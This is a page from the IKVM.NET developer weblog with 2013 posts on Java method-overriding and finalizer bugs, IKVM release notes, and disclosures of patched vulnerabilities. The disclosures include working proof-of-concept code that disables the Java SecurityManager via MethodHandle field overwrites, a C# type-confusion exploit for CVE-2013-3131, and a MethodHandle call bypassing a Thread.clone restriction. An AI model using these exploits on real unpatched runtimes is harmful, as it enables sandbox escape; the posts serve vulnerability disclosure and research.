<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>IKVM.NET Weblog</title>
<link rel="stylesheet" type="text/css" href="/themes/dasBlog/base.css" />
</head>

<body><form name="_ctl0" method="post" action="/CategoryView.aspx?category=" id="_ctl0">
<input type="hidden" name="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" value="" />
<input type="hidden" name="__VIEWSTATE" value="dDwyMzg1MDkwODQ7dDw7bDxpPDA+Oz47bDx0PDtsPGk8Mz47PjtsPHQ8O2w8aTwxMT47PjtsPHQ8O2w8aTwxPjtpPDU+O2k8OT47aTwxMT47PjtsPHQ8cDxwPGw8VGV4dDs+O2w8VXNlcm5hbWU7Pj47Pjs7Pjt0PHA8cDxsPFRleHQ7PjtsPFBhc3N3b3JkOz4+Oz47Oz47dDxwPHA8bDxUZXh0Oz47bDxSZW1lbWJlciBMb2dpbjs+Pjs+Ozs+O3Q8cDxwPGw8VGV4dDs+O2w8U2lnbiBJbjs+Pjs+Ozs+Oz4+Oz4+Oz4+Oz4+O2w8X2N0bDM5OTc6cmVtZW1iZXJDaGVja2JveDs+Pj81b+6EGRC1McB4aXvdsHH7Ac5j" />

<script language="javascript" type="text/javascript">
<!--
	function __doPostBack(eventTarget, eventArgument) {
		var theform;
		if (window.navigator.appName.toLowerCase().indexOf("microsoft") > -1) {
			theform = document._ctl0;
		}
		else {
			theform = document.forms["_ctl0"];
		}
		theform.__EVENTTARGET.value = eventTarget.split("$").join(":");
		theform.__EVENTARGUMENT.value = eventArgument;
		theform.submit();
	}
// -->
</script>

<base href="http://weblog.ikvm.net/">
<div id="header">
<table width="100%" border="0"><tr><td>
    <h1 id="title"><a href="/" style="text-decoration:none;"><span style="color:black;">IKVM.NET Weblog</span></a></h1>
    <p id="byline">The development of a Java VM for .NET</p>

</td><td align="right">
<input name="_ctl1:TextBox1" type="text" id="_ctl1_TextBox1" />
<input type="submit" name="_ctl1:Button1" value="Search" id="_ctl1_Button1" />

</td></tr>
<tr><td colspan="2"><hr style="height: 1px; border: 1px dashed black"/></td></tr></table>
</div>


<div id="content">
	<div class="date"><h2 class="dateHeader">Tuesday, 29 October 2013</h2></div>
<div class="newsItems"><a name="a87432f77-7e58-4f37-9f6d-d5bac453c7d6"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 8 of ∞</h3>
	<div class="entryBody">
		<P>Due to my laziness and lameness my <A HREF="/PermaLink.aspx?guid=cce26630-b8f3-4a05-b9d3-2426fb442385">previous post</A> wasn't as convincing as it should have been, so I'm going to try again.</P>
<P>Take this code:</P>
<P><CODE>class A {<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; A obj = new B();<BR>&nbsp;&nbsp;&nbsp; obj.finalize();<BR>&nbsp;&nbsp;&nbsp; obj = null;<BR>&nbsp;&nbsp;&nbsp; System.gc();<BR>&nbsp;&nbsp;&nbsp; System.runFinalization();<BR>&nbsp; }<BR><BR>&nbsp; protected void finalize() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("A.finalize");<BR>&nbsp; }<BR>}<BR><BR>class B extends A {<BR>&nbsp; private void fin_lize() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("B.finalize");<BR>&nbsp; }<BR>} </CODE></P>
<P>Compile this and patch B.class to replace <CODE>fin_lize</CODE> with <CODE>finalize</CODE>.</P>
<P>What is the expected output of this program? In my opinion it is:</P>
<P><CODE>A.finalize<BR>A.finalize</CODE></P>
<P>This is also the output that both JDK 1.1 and IKVM.NET give. However, on JDK 1.5 and up the output is:</P>
<P><CODE>A.finalize<BR>B.finalize</CODE></P>
<P>This did not change in the 7u45 update.</P>
<P>To me the above is already enough to obviously demonstrate the problem, but since I'm apparently somewhat atypical I'm going to try to explain a bit more carefully.</P>
<OL>
<LI>The <A href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.4.5">Java 7 vmspec</A> claims that private methods can override base class methods.</LI>
<LI>JVMS section <STRONG>5.4.5. Method overriding</STRONG> was added in the Java 7 edition of the JVMS. It is clearly incorrect as it disagrees with both previous and current behavior of all known JVMs.</LI>
<LI>Given that private methods do not in fact override any methods, the check for final base class methods that was introduced in 7u45 is bogus.</LI>
<LI>What should have been fixed in 7u45 is the native code that calls the finalize method, as it clearly needs to do a virtual invocation of Object.finalize() not call the private B.finalize method.</LI></OL>
<P>I hope I've done a better job now of making clear way the 7u45 update is bogus, the JVMS spec change is wrong and that finalization still needs to be fixed.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/29/2013 13:53:34 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=87432f77-7e58-4f37-9f6d-d5bac453c7d6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=87432f77-7e58-4f37-9f6d-d5bac453c7d6">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 17 October 2013</h2></div>
<div class="newsItems"><a name="acce26630-b8f3-4a05-b9d3-2426fb442385"></a><div class="entry">
	<h3 class="entryTitle">Java Method Overriding Is FUBAR Part 7 of ∞</h3>
	<div class="entryBody">
		<P>My friends at Oracle seem determined to make me finish my infinite series of <A href="/PermaLink.aspx?guid=bde44d8b-7ba9-4e0e-b3a6-b735627118ff">blog</A> <A href="/PermaLink.aspx?guid=26f52fff-7284-4d90-bff5-cbfb3fae94ed">posts</A> <A href="/PermaLink.aspx?guid=799f5ea0-6648-46c0-b70d-e9b80c6d2669">of</A> <A href="/PermaLink.aspx?guid=b71f9c5c-ce57-4620-a3bd-b30f9cbe3d4e">Java</A> <A href="/CommentView.aspx?guid=f58b4ef6-4077-4f23-a840-b784d28db586">method</A> <A href="/PermaLink.aspx?guid=20d36b38-5aa8-47df-bad6-297d02dbeb4f">overriding</A>.</P>
<P>Before the <A href="http://www.oracle.com/technetwork/topics/security/cpuoct2013-1899837.html">7u45 security update</A> the following (pseudo) code ran fine:</P>
<P><CODE>class A {<BR>&nbsp; final void m() { }<BR>}<BR><BR>class B extends A {<BR>&nbsp; private void m() { }<BR>}</CODE></P>
<P>Now with 7u45, loading class B throws an exception:<BR><BR><CODE>java.lang.VerifyError: class B overrides final method m.()V</CODE></P>
<P>This makes <A href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.4.5">no sense</A> at all and is a <A href="http://cr.openjdk.java.net/~asaha/openJDK.7u45.sync/webrev/hotspot/src/share/vm/classfile/classFileParser.cpp.udiff.html">misguided attempt</A> to fix the issue I reported <A href="/PermaLink.aspx?guid=0f35cb7d-e3b3-400b-b829-6c975fa97646">here</A>. Ironically, it doesn't even completely fix the issue, because a static finalize method still prevents the final finalizer from running:</P>
<P><CODE>class A {<BR>&nbsp; protected void finalize() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("A.finalize");<BR>&nbsp; }<BR>}<BR><BR>class B extends A {<BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; new B();<BR>&nbsp;&nbsp;&nbsp; System.gc();<BR>&nbsp;&nbsp;&nbsp; System.runFinalization();<BR>&nbsp; }<BR><BR>&nbsp; private static void finalize() { }<BR>}</CODE></P>
<P>Pre-emptive comment about comments: Feel free to leave comments, but I'm not going to respond to people that clearly don't have a clue.</P>
<P><STRONG>Update: I misread the spec. The change is actually in line with the spec. Unfortunately the spec is wrong.</STRONG></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		10/17/2013 09:33:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cce26630-b8f3-4a05-b9d3-2426fb442385"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cce26630-b8f3-4a05-b9d3-2426fb442385">Comments [8]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 10 July 2013</h2></div>
<div class="newsItems"><a name="a50d94ff6-f418-42b4-8cc5-33996d0c7cf3"></a><div class="entry">
	<h3 class="entryTitle">Type Confusion PoC for CVE-2013-3131 (MS13-052)</h3>
	<div class="entryBody">
		<P>I did not discover this vulnerability (<A href="http://connect.microsoft.com/VisualStudio/feedback/details/771109/bug-in-accessing-x64-bit-multidimensional-arrays-in-x64-release-compilation-via-enumerator-interface">Alon Fliess filed the (public) bug report</A>), but I decided to investigate it and write a PoC exploit:</P>
<P><CODE>using System;<BR>using System.Runtime.CompilerServices;<BR><BR>struct Foo {<BR>&nbsp; byte b1, b2, b3;<BR>}<BR><BR>class U1 { }<BR>class U2 { }<BR><BR>struct StackFields {<BR>&nbsp; internal object f1;<BR>&nbsp; internal U1 f2;<BR>&nbsp; internal U2 f3;<BR>}<BR><BR>class Program {<BR>&nbsp; long field1;<BR>&nbsp; long field2;<BR><BR>&nbsp; static void Main() {<BR>&nbsp;&nbsp;&nbsp; new Program().Get(new Foo[1, 1]);<BR>&nbsp; }<BR><BR>&nbsp; [MethodImpl(MethodImplOptions.NoInlining)]<BR>&nbsp; object Get<T>(T[,] arr) {<BR>&nbsp;&nbsp;&nbsp; StackFields fields = new StackFields();<BR>&nbsp;&nbsp;&nbsp; fields.f1 = new U1();<BR>&nbsp;&nbsp;&nbsp; fields.f2 = new U1();<BR>&nbsp;&nbsp;&nbsp; fields.f3 = new U2();<BR>&nbsp;&nbsp;&nbsp; arr.ToString();<BR>&nbsp;&nbsp;&nbsp; object v = arr[0, 0];<BR>&nbsp;&nbsp;&nbsp; field2 = field1;<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(fields.f3);<BR>&nbsp;&nbsp;&nbsp; return v;<BR>&nbsp; }<BR>}</CODE></P>
<P>This requires .NET 4.5 x64 (and must be built/run in release mode).</P>
<P>The bug is that the array accessor that is generated clobbers the RSI and RDI registers.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/10/2013 13:05:47 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=50d94ff6-f418-42b4-8cc5-33996d0c7cf3"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=50d94ff6-f418-42b4-8cc5-33996d0c7cf3">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 30 May 2013</h2></div>
<div class="newsItems"><a name="a0f35cb7d-e3b3-400b-b829-6c975fa97646"></a><div class="entry">
	<h3 class="entryTitle">Overriding a Final Finalize</h3>
	<div class="entryBody">
		<P>Compile the following code:</P><CODE>class Base {<BR>&nbsp; protected final void finalize() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("Base.finalize");<BR>&nbsp; }<BR>}<BR><BR>class Derived extends Base {<BR>&nbsp; private void fin_lize() {<BR>&nbsp;&nbsp;&nbsp; System.out.println("Derived.finalize");<BR>&nbsp; }<BR><BR>&nbsp; public static void main(String[] args) {<BR>&nbsp;&nbsp;&nbsp; new Derived();<BR>&nbsp;&nbsp;&nbsp; System.gc();<BR>&nbsp;&nbsp;&nbsp; System.runFinalization();<BR>&nbsp; }<BR>}</CODE> 
<P>Now patch Derived.class with a hex editor to change <STRONG>fin_lize</STRONG> to <STRONG>finalize</STRONG>. Run with OpenJDK or Oracle JRE/JDK and observe that Derived.finalize is printed.</P>
<P>This happens because the finalize method is called via JNI reflection and the method name is resolved against the real object type instead of java.lang.Object. The OpenJDK code can be seen <A href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/a2a2a91075ad/src/share/native/java/lang/ref/Finalizer.c">here</A>.</P>
<P>A better way to do this would be to add an invokeFinalize method to <A href="http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/a2a2a91075ad/src/share/classes/sun/misc/JavaLangAccess.java">JavaLangAccess</A>. This avoids the expense of native code and reflection.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/30/2013 16:11:44 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=0f35cb7d-e3b3-400b-b829-6c975fa97646"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=0f35cb7d-e3b3-400b-b829-6c975fa97646">Comments [14]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 18 April 2013</h2></div>
<div class="newsItems"><a name="a32db7dc2-ea2d-4113-86a1-164cd78f904f"></a><div class="entry">
	<h3 class="entryTitle">The End of ACC_SUPER</h3>
	<div class="entryBody">
		<P>Yesterday I wrote about the security issue fixed in <A href="http://www.oracle.com/technetwork/topics/security/javacpuapr2013-1928497.html">Update 21</A>. Today I'll describe the "Security-In-Depth" issue.</P>
<P>As a result of the <A HREF="/PermaLink.aspx?guid=23cced47-ccdb-460d-acc9-ce16154ab6a5">Thread Cloning Vulnerability</A>, Oracle removed honoring the absense of <A HREF="/PermaLink.aspx?guid=99fcff6c-8ab7-4358-9467-ddf71dd20acd">ACC_SUPER</A> from HotSpot in <A href="http://www.oracle.com/technetwork/topics/security/javacpufeb2013-1841061.html">Update 13</A>. The HotSpot patch can be seen <A href="http://hg.openjdk.java.net/jdk7u/jdk7u/hotspot/rev/db7028c8a953">here</A>.</P>
<P>Again, while working on IKVM's dynamic binding, I found that it was still possible to do a non-virtual invocation of an overridden method by using a MethodHandle. This was fixed in Update 21.</P>
<P>Here's an example that uses <A href="https://blogs.oracle.com/jrose/entry/a_modest_tool_for_writing">Indify</A> to generate the MethodHandle constants and manages to call Object.clone() on a Thread object on Update 13:</P><CODE>import java.lang.invoke.*;<BR><BR>class test extends Thread implements Cloneable {<BR>&nbsp; public static void main(String[] args) throws Throwable {<BR>&nbsp;&nbsp;&nbsp; test obj = new test();<BR>&nbsp;&nbsp;&nbsp; System.out.println(obj == MH_1().invokeExact(obj));<BR>&nbsp; }<BR><BR>&nbsp; private static MethodHandle MH_1() throws Throwable {<BR>&nbsp;&nbsp;&nbsp; return MethodHandles.lookup().findSpecial(Object.class, "clone", MethodType.methodType(Object.class), test.class);<BR>&nbsp; }<BR>}</CODE> 
<P>You can compile and run this without Indify and it will show the problem (on versions before Update 21), but you need to run Indify to make it work with an active SecurityManager.</P>
<P>The difference between looking up method handles via the API versus using MethodHandle constants is analogous to the difference between normal bytecode method invocation and classic reflection. When going via the API the SecurityManager is involved, but the runtime linker does not call the SecurityManager. MethodHandle constants (when they are properly implemented) don't allow you to do anything that normal bytecode can't do. This is why the claim made by Security Explorations about <A href="http://seclists.org/fulldisclosure/2013/Mar/167">Issue 54</A> was incorrect.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/18/2013 08:55:58 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=32db7dc2-ea2d-4113-86a1-164cd78f904f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=32db7dc2-ea2d-4113-86a1-164cd78f904f">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 17 April 2013</h2></div>
<div class="newsItems"><a name="aacd2dd6d-1028-4996-95df-efa42ac237f0"></a><div class="entry">
	<h3 class="entryTitle">Java 7 Update 21</h3>
	<div class="entryBody">
		<P>While I was working on rewriting IKVM's <A HREF="/PermaLink.aspx?guid=467b6c9e-d9f6-4c6f-8de0-10c4f30ec5a9">dynamic binding</A> support based on method handles I <A href="https://twitter.com/JeroenFrijters/status/308622196518047745">stumbled</A> into a rather serious bug in the Oracle Java implementation. It allowed any code to overwrite public final fields. This has been fixed in <A href="http://www.oracle.com/technetwork/topics/security/javacpuapr2013-1928497.html">Update 21</A>.</P>
<P>Below is a proof of concept that disables the security manager. It works by changing <A href="http://docs.oracle.com/javase/7/docs/api/java/lang/Double.html#TYPE">Double.TYPE</A> to <A href="http://docs.oracle.com/javase/7/docs/api/java/lang/Integer.html#TYPE">Integer.TYPE</A> and then using reflection to copy an integer field from one object to another, but because of the patched TYPE fields reflection thinks the integer field is a double and copies 8 bytes instead of 4.</P><CODE>import java.lang.invoke.MethodHandle;<BR>import java.lang.reflect.Field;<BR>import static java.lang.invoke.MethodHandles.lookup;<BR><BR>class Union1 {<BR>&nbsp; int field1;<BR>&nbsp; Object field2;<BR>}<BR><BR>class Union2 {<BR>&nbsp; int field1;<BR>&nbsp; SystemClass field2;<BR>}<BR><BR>class SystemClass {<BR>&nbsp; Object f1,f2,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,<BR>&nbsp;&nbsp;&nbsp; f13,f14,f15,f16,f17,f18,f19,f20,f21,f22,f23,<BR>&nbsp;&nbsp;&nbsp; f24,f25,f26,f27,f28,f29,f30;<BR>}<BR><BR>class PoC {<BR>&nbsp; public static void main(String[] args) throws Throwable {<BR>&nbsp;&nbsp;&nbsp; System.out.println(System.getSecurityManager());<BR>&nbsp;&nbsp;&nbsp; disableSecurityManager();<BR>&nbsp;&nbsp;&nbsp; System.out.println(System.getSecurityManager());<BR>&nbsp; }<BR><BR>&nbsp; static void disableSecurityManager() throws Throwable {<BR>&nbsp;&nbsp;&nbsp; MethodHandle mh1, mh2;<BR>&nbsp;&nbsp;&nbsp; mh1 = lookup().findStaticSetter(Double.class, "TYPE", Class.class);<BR>&nbsp;&nbsp;&nbsp; mh2 = lookup().findStaticSetter(Integer.class, "TYPE", Class.class);<BR>&nbsp;&nbsp;&nbsp; Field fld1 = Union1.class.getDeclaredField("field1");<BR>&nbsp;&nbsp;&nbsp; Field fld2 = Union2.class.getDeclaredField("field1");<BR>&nbsp;&nbsp;&nbsp; Class classInt = int.class;<BR>&nbsp;&nbsp;&nbsp; Class classDouble = double.class;<BR>&nbsp;&nbsp;&nbsp; mh1.invokeExact(int.class);<BR>&nbsp;&nbsp;&nbsp; mh2.invokeExact((Class)null);<BR>&nbsp;&nbsp;&nbsp; Union1 u1 = new Union1();<BR>&nbsp;&nbsp;&nbsp; u1.field2 = System.class;<BR>&nbsp;&nbsp;&nbsp; Union2 u2 = new Union2();<BR>&nbsp;&nbsp;&nbsp; fld2.set(u2, fld1.get(u1));<BR>&nbsp;&nbsp;&nbsp; mh1.invokeExact(classDouble);<BR>&nbsp;&nbsp;&nbsp; mh2.invokeExact(classInt);<BR>&nbsp;&nbsp;&nbsp; if (u2.field2.f29 == System.getSecurityManager()) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u2.field2.f29 = null;<BR>&nbsp;&nbsp;&nbsp; } else if (u2.field2.f30 == System.getSecurityManager()) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; u2.field2.f30 = null;<BR>&nbsp;&nbsp;&nbsp; } else {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("security manager field not found");<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>} </CODE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		04/17/2013 08:00:08 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=acd2dd6d-1028-4996-95df-efa42ac237f0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=acd2dd6d-1028-4996-95df-efa42ac237f0">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 28 March 2013</h2></div>
<div class="newsItems"><a name="af3c13712-e52a-41c4-b6d9-073617f04c90"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.3 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The first release candidate is available. It can be downloaded here or from <A href="https://nuget.org/packages/IKVM/7.3.4830.0">NuGet</A>.</P>
<P>What's New (relative to <A HREF="/PermaLink.aspx?guid=926e3554-259e-49a6-82fc-459fbd61ac19">IKVM.NET 7.2</A>):</P>
<UL>
<LI>Greatly improved support for dynamically loading classes in statically compiled assembly class loaders.</LI>
<LI>Changed ikvmc to default to using runtime binding when a class is not available at compile time.</LI>
<LI>Fixed ikvmc to use jar class loading that matches the runtime.</LI>
<LI>The runtime now projects stub classes into the (virtual file system) jars they came from.</LI>
<LI>Runtime stub classes are now generated by the same code as ikvmstub uses.</LI>
<LI>Fixed a typo in ikvm.runtime.Startup.addBootClassPathAssembly() method name. </LI>
<LI>Fixed memory model bugs on ARM.</LI>
<LI>Many bug fixes.</LI>
<LI>Improved ikvmc error messages.</LI>
<LI>Deprecated using stub classes with ikvmc.</LI>
<LI>Added IKVM.Attributes.JavaResourceAttribute to allow .NET resource to be exposed to Java.</LI>
<LI>Font API improvements.</LI>
<LI>Graphics API improvements.</LI>
<LI>Support building IKVM.NET on .NET 4.5, but targetting .NET 4.0.</LI></UL>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Volatile long/double fields should not use slow reflection.</LI>
<LI>Reduce complexity of annotation custom attributes construction to improve performance and lower risk (for broken apps that should have used ReflectionOnly).</LI>
<LI>Removed accidentally public methods from ikvm.internal.AnnotationAttributeBase.</LI>
<LI>Fixed ikvm.internal.AnnotationAttributeBase to freeze in writeReplace/Equals/GetHashCode/ToString.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4830.0.zip">ikvmbin-7.3.4830.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.3.4830.0.zip">ikvmsrc-7.3.4830.0.zip</A>, <A href="http://www.frijters.net/openjdk-7u6-b24-stripped.zip">openjdk-7u6-b24-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/28/2013 09:27:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f3c13712-e52a-41c4-b6d9-073617f04c90"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f3c13712-e52a-41c4-b6d9-073617f04c90">Comments [8]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 March 2013</h2></div>
<div class="newsItems"><a name="a8ccca407-5de2-4560-9d3b-5aba01bb0e62"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>My burst of inspiration ended. So I guess it's time to do a release soon.</P>
<P>Changes:</P>
<UL>
<LI>Expose Java 8 static interface methods as static methods via nested __Methods type.</LI>
<LI>Expose Java 8 default interface methods as static methods via nested __DefaultMethods type.</LI>
<LI>Build fix. When doing a clean build the two generated Java source files don't exist yet, so we process the .in files instead.</LI>
<LI>Added nuget package creation build file.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4826.zip">ikvmbin-7.3.4826.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/19/2013 12:28:00 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8ccca407-5de2-4560-9d3b-5aba01bb0e62"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8ccca407-5de2-4560-9d3b-5aba01bb0e62">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 11 March 2013</h2></div>
<div class="newsItems"><a name="a467b6c9e-d9f6-4c6f-8de0-10c4f30ec5a9"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I'm still working on issues resulting from <A href="/PermaLink.aspx?guid=42729fb3-af19-4249-a9c1-88f1a82874e3">the big change</A>. There are some more known issues and probably a few unknown ones. However, I couldn't help myself and decided to a little bit of work on Java 8 support. If you define the IKVM_EXPERIMENTAL_JDK_8 environment variable, you can now run Java 8 class files that use the new static and default interface method features.</P>
<P>There is no interop with other .NET languages yet, so you won't be able to call static interface methods from (e.g.) C# or take advantage of default interface method implementations. The interop story for default interface methods isn't going to be great even when it is done. You'll have to manually call the default methods in your C# code. Something like this:</P>
<P><CODE>class MyCSharpClass : SomeJavaInterface {<BR>&nbsp;&nbsp; public void method() {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SomeJavaInterface.__DefaultMethods.method(this);<BR>&nbsp;&nbsp; }<BR>}</CODE></P>
<P>Changes:</P>
<UL>
<LI>Optimized some dynamic binding operations. 
<LI>Switched dynamic field binding to method handles. 
<LI>Removed "effectively final" optimization because it breaks the ability to dynamically load subclasses. 
<LI>Added experimental support for static methods in interfaces (for Java 8 class files). 
<LI>Added experimental support for default interfaces methods (for Java 8 class files). 
<LI>Fixed an ikvmc crash when a member is accessed on a type from a missing assembly. 
<LI>Fixed transparency artefact with AlphaComposite.Src and and anti-aliased text. 
<LI>Bug fix. Don't implement interfaces that aren't accessible. 
<LI>Changed TextArea peer from TextBox to RichTextBox (to handle LF correctly) and implemented replaceRange. 
<LI>Tweaked f2i, f2l, d2i and d2l bytecodes to be a bit faster in the common case.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4817.zip">ikvmbin-7.3.4817.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/11/2013 08:35:25 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=467b6c9e-d9f6-4c6f-8de0-10c4f30ec5a9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=467b6c9e-d9f6-4c6f-8de0-10c4f30ec5a9">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 04 March 2013</h2></div>
<div class="newsItems"><a name="a815ae2af-70a7-48ac-8d16-4502b4a534f8"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Another week, another snapshot.</P>
<P>Changes:</P>
<UL>
<LI>Fixed several annotation encoding issues in new stub class generator.</LI>
<LI>Added back support for exporting annotations in .NET assembly stub classes.</LI>
<LI>Fixed ikvmc to not add ObsoleteAttribute to deprecated types/members that already have an explicit ObsoleteAttribute annotation.</LI>
<LI>Fixed a typo in ikvm.runtime.Startup.addBootClassPathAssembly() method name.</LI>
<LI>Bug fix. .NET enums used in Java annotations were not usable from .NET custom attribute.</LI>
<LI>Added license headers to build scripts.</LI>
<LI>Made boot class package handling simpler (more OpenJDK based). The package information is now read from the manifest instead of hard coded.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.3.4811.zip">ikvmbin-7.3.4811.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/04/2013 09:20:59 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=815ae2af-70a7-48ac-8d16-4502b4a534f8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=815ae2af-70a7-48ac-8d16-4502b4a534f8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 25 February 2013</h2></div>
<div class="newsItems"><a name="aa4cc186b-1934-4e96-8571-8f81f3771e4e"></a><div class="entry">
